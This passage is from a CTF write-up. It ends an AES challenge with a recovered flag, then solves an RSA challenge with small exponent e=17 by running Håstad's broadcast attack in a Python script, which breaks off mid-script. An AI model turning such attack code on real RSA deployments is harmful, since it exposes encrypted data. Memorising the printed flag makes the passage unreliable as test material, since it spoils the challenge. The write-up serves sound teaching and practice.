&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;System&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;out&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;println&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;decrypted Flag: &amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span&gt; decryptedFlag)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;catch &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;Exception &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;e&lt;&#x2F;span&gt;&lt;span&gt;) {
&lt;&#x2F;span&gt;&lt;span&gt;        e&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;printStackTrace&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag : n00bz{1_d0n&#x27;t_l1k3_a3s_ch4ll3ng3_d0_y0u_lik3?_41703148ed8347adbe238ffbdbaf5e16}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;h1 id=&quot;rsa&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#rsa&quot; aria-label=&quot;Anchor link for: rsa&quot;&gt;RSA&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;Description :&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;text&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-text &quot;&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;&lt;span&gt;Good old RSA!
&lt;&#x2F;span&gt;&lt;span&gt;Note: The server is not slow, but I have added sleep(0.5) to discourage server-overloading
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;Challenge : nc challs.n00bzunit3d.xyz 2069
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Connecting to remote server prints the &lt;code&gt;e,ct,n&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;sh&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-sh &quot;&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mj0ln1r@Linux:&#x2F;$&lt;&#x2F;span&gt;&lt;span&gt; nc challs.n00bzunit3d.xyz 2069
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;e&lt;&#x2F;span&gt;&lt;span&gt; = 17
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;ct&lt;&#x2F;span&gt;&lt;span&gt; = 1918419302512753057026648318712029212067010068881776194471911962400069730845220554390418545347081265589418087805348825538165335709592014756820975351562055168955223920260866129238091331258878862319021642420202215258606989689113199126395237258044609779214578192243449718779680984760821625858488092089359110586029718810681216404967086632022871285987871728190628649296724396627035003944211094642018641120662826716949842719001445471014439720788221673768914466721673069869698075926557748651966891705424368924478424517777871952868261029557663107718103335011473285197254398042919715068012844634957684894193434195869239068361
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;n&lt;&#x2F;span&gt;&lt;span&gt; = 14832509636507518025719146267736016746158063550394935168412013748335364245353808905385111963238312617375598452528117469774547055863886693759109386524161524612219187310620642861751727390080228470399915831962109423586699463124268161225204497782468596150935245876004207368769051381898376188367523380538876599098718935048131575812284079693918194244033223432954665821748431737895979497331176489236217817178707602095903865212414896508729061545245146796357745605104159549612795957395255113962822207738386196802129262229049641241406827025758240064180040710051728573495643489157496185047749682432777350823891031789833038567873
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mj0ln1r@Linux:&#x2F;$&lt;&#x2F;span&gt;&lt;span&gt; nc challs.n00bzunit3d.xyz 2069
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;e&lt;&#x2F;span&gt;&lt;span&gt; = 17
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;ct&lt;&#x2F;span&gt;&lt;span&gt; = 6447479954206712453684049812027099180350107523878886559254782127138060412563172212349826966608914764574556165604677352743246072017379611338487049428209406433401510022231968362832812309941039444272178839928281693494111249162879326560937674167247955719542277558712981385601628687847446245832213044736093542641210520134610326729270324684879617665915452957893305915041558672493582653588401873353410692223555925326728236048779812407143165135068210994332362942264737082889801514367932166315908399995278888726027572063051830808932920231748324587587571382293739656878823511803124406070423703233735551773867411349962410027067
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;n&lt;&#x2F;span&gt;&lt;span&gt; = 9143151830717182052453590085412689929033277379344799430177196398722726776018026343096576694230511985079459043484573394967898934809585827166269500895380393285269881528194291832047352577459413344409493792541600865505980864548382947581835053230490436884828168850991984975137721737418032909519631817776834105704909176140746238694512870331896652202760838235320128117091683820284458749969419156010843857076058164726947867143672197927426528810425546295393373613926717047266991925845444620101181260763809774718637475254501710229446293016879391010346082471422865608808948260049617262947181947600762037856135644565615356696271
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Observations :&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#fafafa;color:#61676c;&quot;&gt;&lt;code&gt;&lt;span&gt;1. As we can see, server printing different ct,n and same e=17 for each new connection.
&lt;&#x2F;span&gt;&lt;span&gt;2. e was too small
&lt;&#x2F;span&gt;&lt;span&gt;3. No common factors between two n&amp;#39;s (common modulus attack wont applied)
&lt;&#x2F;span&gt;&lt;span&gt;4. Plaintext was encrypted with same e=17 with different modulus
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;By the observations the &lt;code&gt;e=17&lt;&#x2F;code&gt; looks small. The message in RSA is simply the &lt;code&gt;e&#x27;th root of ct&lt;&#x2F;code&gt;, when the e is small enough it would be easy to compute without the private exponent.&lt;&#x2F;p&gt;
&lt;p&gt;Here the e=17 is small enough to do it,&lt;&#x2F;p&gt;
&lt;p&gt;17&#x27;th root of initial ct gave us the error, that is it has no perferct 17&#x27;th root.&lt;&#x2F;p&gt;
&lt;p&gt;But,&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#fafafa;color:#61676c;&quot;&gt;&lt;code&gt;&lt;span&gt;1. Plaintext was same everytime
&lt;&#x2F;span&gt;&lt;span&gt;2. Different modulus(n1,n2,..)
&lt;&#x2F;span&gt;&lt;span&gt;3. Different ciphertext(c1,c2,..)
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;We can find the solution to the above system that is C which satisfies each equation&lt;&#x2F;p&gt;
&lt;p&gt;(C = c1 mod n1), (C = c2 mod n2),....&lt;&#x2F;p&gt;
&lt;p&gt;So, we can use the &lt;code&gt;Chinese Remaider Theorem&lt;&#x2F;code&gt; to solve for the common &lt;code&gt;C&lt;&#x2F;code&gt; which can fit in all the conditions.&lt;&#x2F;p&gt;
&lt;p&gt;After finding the &lt;code&gt;C&lt;&#x2F;code&gt; we can apply the 17&#x27;th root of &lt;code&gt;C&lt;&#x2F;code&gt; to get the plaintext.&lt;&#x2F;p&gt;
&lt;p&gt;Here is my solve.py&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;solve.py&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;gmpy2
&lt;&#x2F;span&gt;&lt;span&gt;gmpy2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;get_context&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;precision &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;4096
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;binascii &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;unhexlify
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;functools &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;reduce
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;gmpy2 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;root
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# H√•stad&amp;#39;s Broadcast Attack
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;EXPONENT &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;17
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;c1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;7946043177938634894468433929073404673651875154647156508100839891449515149691686945995056602586944710327623300157734254965701993446310048878003244839505812174155025756246399456396630569716457360433801430476106400774865547279377861969979287733835750064754554220594527757651036422858155930651992095851602614627439063339245596216907989179295201194329197537828395638432777873627494874484442644162351506092674786914498798694380659404260196539645455287503433027367549309610352113572801657272668352732212443182638961092249449922085083328639368402363873369662072747755828243417869725889727969222941496766161784323302414216954
&lt;&#x2F;span&gt;&lt;span&gt;c2 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;12959573845685261486267397567112966488661691735414128259078491897996382414767291825628759526056897899253181537775863221611499490716812639282748479179124748696317221066942560992747945889171265338732860145466990785636517790722281378157380384521300704615814738956601099155119020464363668056528769776407040455062919016852662191860740902289863302299951158808734895396092718815039921735596667791228501328047526301396156478459414130901590537241875751813223439101873009005799006566824944416318134509872895247494905723306736031607559813033586425623787957866825634139736990176386467235744665177488925198627943203730320042768887
&lt;&#x2F;span&gt;&lt;span&gt;n1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;17034440041769803013819987353259492052814047368802180553596332096232727428488407203629163872404893931800862659994426997044166691466452481674980731442588400925186076344115666523148148851729508568172248290848201341876249300702580615286136569268722103616878519428285998872272711491239079124967747524881729763554344521296227022124958916574705766479633287283765067948684030317008945004545691849344955755112782085223696765257525483464996334206039708539941173320021312903082525289861923741817167776417841751055018102296324303346467734670876150247432996078826945704561216298507441793730648326675429211605408858351177990334143
&lt;&#x2F;span&gt;&lt;span&gt;n2 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;17331299556630461029385232478393964321767599062981408558650170147730226667533079244038574631307826365292089835102067792983012928286988717407754509869684529210063898492076207785486047907744775354150474153932697409696268275174493130991110443360842923132578722743840846113197396873571123689245296146539892440667216842709178563761357112687102468939184745813114523671087689869743503793819274991554446204103603913471104472290485745834733456528879928652595610724965467569123797267442161308276102082738205391230941134328580245092921418147467984772008789925177804751341454022407072603374059077834470295173426162921767901044463
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;chinese_remainder_theorem&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;items&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# Determine N, the product of all n_i
&lt;&#x2F;span&gt;&lt;span&gt;    N &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;a&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;n &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span&gt;items:
&lt;&#x2F;span&gt;&lt;span&gt;        N &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;*= &lt;&#x2F;span&gt;&lt;span&gt;n
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# Find the solution (mod N)
&lt;&#x2F;span&gt;&lt;span&gt;    result &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;a&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;n &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span&gt;items:
&lt;&#x2F;span&gt;&lt;span&gt;        m &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;N &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&#x2F;&#x2F; &lt;&#x2F;span&gt;&lt;span&gt;n
&lt;&#x2F;span&gt;&lt;span&gt;        r, s, d &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;extended_gcd&lt;&#x2F;span&gt;&lt;span&gt;(n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;m)
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;d &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;!= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;raise &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Input not pairwise co-prime&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;        result &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span&gt;a &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span&gt;s &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span&gt;m
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# Make sure we return the canonical solution.
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;result &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;% &lt;&#x2F;span&gt;&lt;span&gt;N
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;extended_gcd&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;a&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;b&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;    x, y &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1
&lt;&#x2F;span&gt;&lt;span&gt;    lastx, lasty &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;while &lt;&#x2F;span&gt;&lt;span&gt;b:
&lt;&#x2F;span&gt;&lt;span&gt;        a, (q&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;b) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;b, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;divmod&lt;&#x2F;span&gt;&lt;span&gt;(a&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;b)
&lt;&#x2F;span&gt;&lt;span&gt;        x, lastx &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;lastx &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;- &lt;&#x2F;span&gt;&lt;span&gt;q &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span&gt;x, x
&lt;&#x2F;span&gt;&lt;span&gt;        y, lasty &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;lasty &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;- &lt;&#x2F;span&gt;&lt;span&gt;q &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span&gt;y, y
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;(lastx&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;lasty&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;a)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mul_inv&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;a&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;b&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;    b0 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;b
&lt;&#x2F;span&gt;&lt;span&gt;    x0, x1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;b &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;while &lt;&#x2F;span&gt;&lt;span&gt;a &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;        q &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;a &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&#x2F;&#x2F; &lt;&#x2F;span&gt;&lt;span&gt;b
&lt;&#x2F;span&gt;&lt;span&gt;        a, b &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;b, a &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;% &lt;&#x2F;span&gt;&lt;span&gt;b
&lt;&#x2F;span&gt;&lt;span&gt;        x0, x1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;x1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;- &lt;&#x2F;span&gt;&lt;span&gt;q &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span&gt;x0, x0
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;x1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;lt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;        x1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span&gt;b0
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;x1
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;__name__ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;__main__&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    C &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;chinese_remainder_theorem&lt;&#x2F;span&gt;&lt;span&gt;([(c1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;n1)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;(c2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;n2)])
&lt;&#x2F;span&gt;&lt;span&gt;    M &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;root&lt;&#x2F;span&gt;&lt;span&gt;(C&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;17&lt;&#x2F;span&gt;&lt;span&gt;))
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    M &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;hex&lt;&#x2F;span&gt;&lt;span&gt;(M)[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span&gt;]
